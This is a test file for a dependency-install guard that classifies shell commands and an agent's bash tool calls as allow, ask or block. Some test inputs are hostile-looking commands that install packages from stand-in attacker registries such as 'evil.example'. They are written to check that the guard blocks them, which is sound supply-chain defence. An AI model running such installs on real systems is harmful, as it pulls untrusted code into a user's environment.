import test from 'node:test'
import assert from 'node:assert/strict'
import { apply, classifyDependencyCommand } from '../src/index.js'

test('allows unrelated commands', () => assert.equal(classifyDependencyCommand('git status').decision, 'ALLOW'))
test('asks for a new unpinned dependency', () => assert.equal(classifyDependencyCommand('npm install lodash').decision, 'ASK'))
test('allows an explicit versioned dependency', () => assert.equal(classifyDependencyCommand('npm install lodash@4.17.21').decision, 'ALLOW'))
test('blocks git and URL sources', () => {
  assert.equal(classifyDependencyCommand('pip install git+https://github.com/acme/pkg.git').decision, 'BLOCK')
  assert.equal(classifyDependencyCommand('npm install https://example.com/pkg.tgz').decision, 'BLOCK')
})
test('blocks alternate registries', () => assert.equal(classifyDependencyCommand('pip install foo --index-url https://evil.example/simple').decision, 'BLOCK'))
test('asks for implicit install with no explicit package', () => assert.equal(classifyDependencyCommand('pnpm install').decision, 'ASK'))

test('pre-execute hook returns the PreToolDecision kind contract', async () => {
  let listener: ((call: unknown, next: () => Promise<unknown>) => Promise<unknown>) | undefined
  apply({ on: (_event: string, fn: unknown) => { listener = fn as typeof listener } } as never)
  const next = async () => 'next'
  const run = (command: string) => listener!({ name: 'bash', arguments: { command } }, next)

  const deny = await run('npm install --registry https://evil.example.com') as { kind?: string }
  assert.equal(deny.kind, 'deny')
  const ask = await run('npm install lodash') as { kind?: string }
  assert.equal(ask.kind, 'ask')
  assert.equal(await run('npm install lodash@4.17.21'), 'next')
  assert.equal(await run('git status'), 'next')
})
